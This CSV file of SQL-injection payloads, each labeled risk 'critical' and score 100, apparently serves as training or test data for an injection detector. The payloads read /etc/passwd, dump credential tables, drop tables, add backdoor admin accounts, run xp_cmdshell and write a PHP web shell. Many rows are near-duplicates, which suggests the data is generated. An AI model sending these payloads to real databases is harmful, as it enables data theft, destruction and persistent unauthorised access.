query,risk,score
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- OR 1=1 -- ,critical,100
'; DROP TABLE users; -- /* test */ /**/ # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- LIMIT 1",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- g0lg,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- AND 1=1,critical,100
'; SELECT * FROM mysql.user; -- AND 1=1,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # jn44j,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/ # ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # pqy9k,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/ # ,critical,100
'; SELECT * FROM mysql.user; -- OR 1=1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # kxndf,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- AND 1=1,critical,100
'; SELECT load_file('/etc/passwd'); # OR 1=1 -- ,critical,100
'; DROP TABLE users; -- /* test */ OR 1=1 -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- AND 1=1,critical,100
'; SELECT load_file('/etc/passwd'); # OR 1=1 -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- j2qc,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- OR 1=1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # kioqf,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- OR 1=1 -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- AND 1=1,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- AND 1=1",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/ # ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- p1ii,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- OR 1=1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- AND 1=1",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- LIMIT 1",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- LIMIT 1",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # pjk81,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # ws1ez",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # r76jc",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- AND 1=1,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # vkxg7,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- y8g5,critical,100
"' UNION SELECT username, password FROM users /**/ /* OR 1=1 -- ",critical,100
' INTO OUTFILE '/var/www/shell.php' -- # cy3bu,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/ # ,critical,100
'; SELECT * FROM mysql.user; -- # 41xmg,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/ # ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/ # ,critical,100
'; SELECT load_file('/etc/passwd'); # AND 1=1,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # eq9ac,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # 89u9x",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* OR 1=1 -- ",critical,100
'; DROP TABLE users; -- /* test */ OR 1=1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/ # ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/ # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- uxjg",critical,100
"' UNION SELECT username, password FROM users /**/ /* LIMIT 1",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # vi4bl,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # gq7qa,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- AND 1=1,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- LIMIT 1,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- LIMIT 1",critical,100
'; DROP TABLE users; -- /* test */ AND 1=1,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- OR 1=1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- 9o0k,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- AND 1=1",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # p5306",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/ # ,critical,100
"' UNION SELECT username, password FROM users /**/ /* AND 1=1",critical,100
'; SELECT * FROM mysql.user; -- /**/ # ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/ # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- ue1g",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- LIMIT 1",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- OR 1=1 -- ",critical,100
'; SELECT * FROM mysql.user; -- OR 1=1 -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- AND 1=1,critical,100
"' UNION SELECT username, password FROM users /**/ /* LIMIT 1",critical,100
'; DROP TABLE users; -- /* test */ # g6l4o,critical,100
"' UNION SELECT username, password FROM users /**/ /* AND 1=1",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/ # ,critical,100
'; SELECT load_file('/etc/passwd'); # /**/ # ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/ # ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- LIMIT 1,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- AND 1=1",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/ # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/ # ",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- LIMIT 1,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/ # ,critical,100
"' UNION SELECT username, password FROM users /**/ /* LIMIT 1",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- OR 1=1 -- ,critical,100
'; SELECT * FROM mysql.user; -- -- kziv,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/ # ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- AND 1=1",critical,100
' INTO OUTFILE '/var/www/shell.php' -- AND 1=1,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/ # ",critical,100
'; DROP TABLE users; -- /* test */ -- 6ldc,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- n7ye",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- jhcw,critical,100
"' UNION SELECT username, password FROM users /**/ /* LIMIT 1",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- OR 1=1 -- ",critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/ # ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- LIMIT 1,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- AND 1=1",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/ # ",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # xl2ph,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- OR 1=1 -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- AND 1=1",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- bhxi",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ir5c,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- AND 1=1,critical,100
'; SELECT * FROM mysql.user; -- OR 1=1 -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/ # ,critical,100
'; DROP TABLE users; -- /* test */ OR 1=1 -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/ # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- LIMIT 1",critical,100
'; DROP TABLE users; -- /* test */ AND 1=1,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- LIMIT 1",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # aslmg,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- OR 1=1 -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- 2ylz,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- 30g8",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- AND 1=1",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # 5fg02,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # 80qzy,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- OR 1=1 -- ",critical,100
' INTO OUTFILE '/var/www/shell.php' -- OR 1=1 -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- kaca,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- AND 1=1",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- 8oti,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # 5hxle",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/ # ,critical,100
'; DROP TABLE users; -- /* test */ AND 1=1,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/ # ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/ # ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- OR 1=1 -- ",critical,100
'; SELECT * FROM mysql.user; -- AND 1=1,critical,100
"' UNION SELECT username, password FROM users /**/ /* # 518em",critical,100
"' UNION SELECT username, password FROM users /**/ /* # x5uif",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- OR 1=1 -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- AND 1=1,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- AND 1=1,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- AND 1=1,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- lj77,critical,100
'; SELECT load_file('/etc/passwd'); # -- 6yi6,critical,100
'; SELECT load_file('/etc/passwd'); # /**/ # ,critical,100
'; DROP TABLE users; -- /* test */ LIMIT 1,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/ # ",critical,100
'; DROP TABLE users; -- /* test */ OR 1=1 -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/ # ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- s6m5,critical,100
'; SELECT load_file('/etc/passwd'); # # ts6cn,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- LIMIT 1,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # vy81a,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- vmry,critical,100
' INTO OUTFILE '/var/www/shell.php' -- AND 1=1,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # vqb01,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- AND 1=1,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # kprd9,critical,100
'; SELECT * FROM mysql.user; -- LIMIT 1,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- LIMIT 1,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # 0yyca,critical,100
' INTO OUTFILE '/var/www/shell.php' -- OR 1=1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/ # ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- LIMIT 1,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1,critical,100
"' UNION SELECT username, password FROM users /**/ /* AND 1=1",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- AND 1=1,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- LIMIT 1,critical,100
'; SELECT * FROM mysql.user; -- -- j75w,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- LIMIT 1,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- 43ot",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/ # ",critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/ # ",critical,100
' INTO OUTFILE '/var/www/shell.php' -- LIMIT 1,critical,100
'; SELECT * FROM mysql.user; -- -- lp7j,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # n7g8o,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/ # ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- AND 1=1,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/ # ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- AND 1=1,critical,100
'; SELECT load_file('/etc/passwd'); # # xobyc,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/ # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/ # ",critical,100
"' UNION SELECT username, password FROM users /**/ /* -- w5k1",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/ # ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/ # ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # 3yheq,critical,100
'; DROP TABLE users; -- /* test */ LIMIT 1,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- OR 1=1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/ # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- LIMIT 1",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/ # ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # 2ehx9,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 -- ,critical,100
'; SELECT load_file('/etc/passwd'); # AND 1=1,critical,100
"' UNION SELECT username, password FROM users /**/ /* LIMIT 1",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/ # ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- LIMIT 1,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # r585x",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/ # ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- AND 1=1",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/ # ,critical,100
'; SELECT * FROM mysql.user; -- OR 1=1 -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- exnr,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- 4rh4,critical,100
'; SELECT load_file('/etc/passwd'); # OR 1=1 -- ,critical,100
'; SELECT load_file('/etc/passwd'); # # vrs0v,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- LIMIT 1,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- 8hff",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/ # ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # wh4vv,critical,100
' INTO OUTFILE '/var/www/shell.php' -- LIMIT 1,critical,100
'; SELECT * FROM mysql.user; -- AND 1=1,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/ # ,critical,100
'; SELECT * FROM mysql.user; -- LIMIT 1,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # hzfzh",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/ # ",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- itrx,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- LIMIT 1,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- LIMIT 1,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- LIMIT 1,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # lh3n5",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- LIMIT 1,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # 8ualz",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- AND 1=1,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1,critical,100
'; DROP TABLE users; -- /* test */ AND 1=1,critical,100
'; DROP TABLE users; -- /* test */ AND 1=1,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # h1pie,critical,100
' INTO OUTFILE '/var/www/shell.php' -- OR 1=1 -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # ds12x,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- OR 1=1 -- ",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- 6zt1,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- AND 1=1,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # 8otnj,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- AND 1=1,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # udcxg,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- xlls,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ersv,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- ndhs",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- AND 1=1,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- AND 1=1",critical,100
'; SELECT load_file('/etc/passwd'); # AND 1=1,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- vv99,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- txpd,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/ # ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # quidz,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- 81hs,critical,100
"' UNION SELECT username, password FROM users /**/ /* AND 1=1",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- AND 1=1,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- 9iwt,critical,100
'; SELECT load_file('/etc/passwd'); # OR 1=1 -- ,critical,100
'; SELECT load_file('/etc/passwd'); # OR 1=1 -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- OR 1=1 -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/ # ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ttd9,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- OR 1=1 -- ",critical,100
'; SELECT load_file('/etc/passwd'); # LIMIT 1,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- AND 1=1,critical,100
'; SELECT * FROM mysql.user; -- # u68fa,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- 0ze3,critical,100
'; DROP TABLE users; -- /* test */ LIMIT 1,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # 29jpn,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # judvf,critical,100
'; DROP TABLE users; -- /* test */ LIMIT 1,critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/ # ",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/ # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/ # ",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- AND 1=1,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- LIMIT 1,critical,100
'; SELECT * FROM mysql.user; -- -- abua,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- AND 1=1,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/ # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- OR 1=1 -- ",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- AND 1=1,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- 3mlo",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # r9zkt",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- OR 1=1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- AND 1=1,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- b80a,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- OR 1=1 -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/ # ,critical,100
'; SELECT * FROM mysql.user; -- /**/ # ,critical,100
'; SELECT * FROM mysql.user; -- AND 1=1,critical,100
'; SELECT load_file('/etc/passwd'); # AND 1=1,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- AND 1=1,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/ # ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # ywr8s",critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- 7as0,critical,100
